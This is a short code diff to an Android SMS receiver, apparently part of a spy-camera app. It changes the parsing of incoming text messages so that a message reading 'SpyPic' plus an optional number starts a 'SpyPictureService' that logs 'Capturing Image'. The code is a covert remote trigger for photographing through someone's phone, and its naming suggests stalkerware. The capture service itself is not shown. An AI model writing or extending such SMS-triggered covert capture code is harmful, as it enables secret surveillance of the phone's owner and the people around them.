@@ -24,8 +24,12 @@ public class SmsReceiver extends BroadcastReceiver {
                         msgs[i] = SmsMessage.createFromPdu((byte[]) pdus[i]);
                         msg_from = msgs[i].getOriginatingAddress();
                         msgBody = msgs[i].getMessageBody();
-                        if (msgBody.equals("SpyPic")) {
-
+                        String intValue = msgBody.replaceAll("[^0-9]", "");
+                        Log.i("SPY_CAM" , "INT :" + intValue);
+                        System.out.println(intValue);
+                        String getMsg = msgBody.replaceAll("[0-9]","");
+                        Log.i("SPY_CAM" , "Msg :" + getMsg);
+                        if (getMsg.equals("SpyPic")) {
                             Log.i("SPY_CAM" , "Capturing Image");
                             Intent serviceIntent = new Intent(context, SpyPictureService.class);
                             context.startService(serviceIntent);
